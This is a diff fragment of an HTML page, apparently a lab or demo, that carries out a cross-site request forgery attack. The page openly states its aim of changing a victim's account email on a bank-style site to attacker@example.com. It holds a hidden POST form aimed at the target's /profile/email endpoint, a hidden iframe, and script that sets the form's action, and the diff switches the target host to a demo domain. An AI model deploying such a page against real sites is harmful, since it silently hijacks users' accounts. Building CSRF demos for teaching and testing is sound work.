@@ -30,18 +30,18 @@
       <p>This page attempts to change the email on the vulnerable site to:</p>
       <p class="highlight">attacker@example.com</p>
       <p>If the target site accepts cross-site POSTs without protection, the email change request will be submitted automatically.</p>
-      <p>Target URL: <code>https://beta-banker.onrender.com/profile/email</code></p>
+      <p>Target URL: <code>https://csrf-bank-demo.onrender.com/profile/email</code></p>
     </section>
   </main>
 
-  <form id="csrfForm" method="POST" action="https://beta-banker.onrender.com/profile/email" target="csrfTarget" class="hidden">
+  <form id="csrfForm" method="POST" action="https://csrf-bank-demo.onrender.com/profile/email" target="csrfTarget" class="hidden">
     <input type="email" name="email" value="attacker@example.com">
     <button type="submit">Update email</button>
   </form>
   <iframe name="csrfTarget" class="hidden" aria-hidden="true"></iframe>
 
   <script>
-    const vulnerableBase = 'https://beta-banker.onrender.com';
+    const vulnerableBase = 'https://csrf-bank-demo.onrender.com';
     const form = document.getElementById('csrfForm');
     form.action = `${vulnerableBase}/profile/email`;
 
